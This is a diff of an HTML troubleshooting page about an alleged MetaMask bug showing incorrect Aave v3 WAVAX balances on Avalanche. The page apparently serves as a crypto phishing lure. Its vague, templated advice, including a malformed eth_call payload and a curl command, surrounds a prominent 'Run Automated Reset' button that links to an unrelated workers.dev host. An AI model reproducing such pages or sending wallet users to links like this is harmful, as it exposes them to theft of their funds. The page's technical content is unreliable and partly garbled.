@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,39 +42,31 @@
 <h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Avalanche network may notice an incorrect balance displayed for their Aave v3 WAVAX tokens, potentially causing confusion and incorrect financial decisions.</li>
+<li>Users of the Metamask extension on the Avalanche network may notice that their Aave v3 WAVAX token balance is displayed incorrectly, potentially causing confusion and affecting their ability to manage their assets effectively.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch in the token balance retrieval mechanism between Metamask and the Aave v3 protocol on the Avalanche network, resulting in an inaccurate display of the user's WAVAX token balance.</li>
+<li>The error occurs due to a bug in the Metamask extension's handling of token balances on the Aave v3 protocol, specifically affecting the WAVAX token on the Avalanche network. This discrepancy can arise from incorrect cache handling, outdated protocol implementations, or issues with the extension's ability to fetch the latest balance data.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Update Metamask to the latest version to ensure compatibility with the Aave v3 protocol.</li>
-<li>Manually add the Aave v3 WAVAX token to Metamask using the token's contract address.</li>
-<li>Use the following JSON payload to update the token balance:</li>
+<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and restart the browser.</li>
+<li>Manually fetch the latest token balance by using the Aave v3 protocol's API:
+  <code>bash
+curl -X GET \
+  https://api.aave.com/api/v2/markets/avalanche \
+  -H 'Content-Type: application/json'</code></li>
+<li>Update the Metamask extension to the latest version to ensure the bug has been patched.
+For more precise control, consider utilizing an external console to execute the above commands.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_call&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...WAVAX token contract address...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x70a0823100000000000000000000000000000000000000000000000000000000000000001&quot;</span>
-<span class="w">    </span><span class="p">},</span>
-<span class="w">    </span><span class="s2">&quot;latest&quot;</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Prerequisites:
-* Metamask extension installed and configured on the Avalanche network
-* Aave v3 protocol enabled on the Metamask extension
-* WAVAX tokens held in the user's wallet
-For further assistance, consider utilizing an external console to execute the JSON payload and verify the token balance.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured on the Avalanche network.</li>
+<li>Aave v3 protocol supported and enabled within the Metamask extension.</li>
+<li>WAVAX token added to the Metamask extension's wallet.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
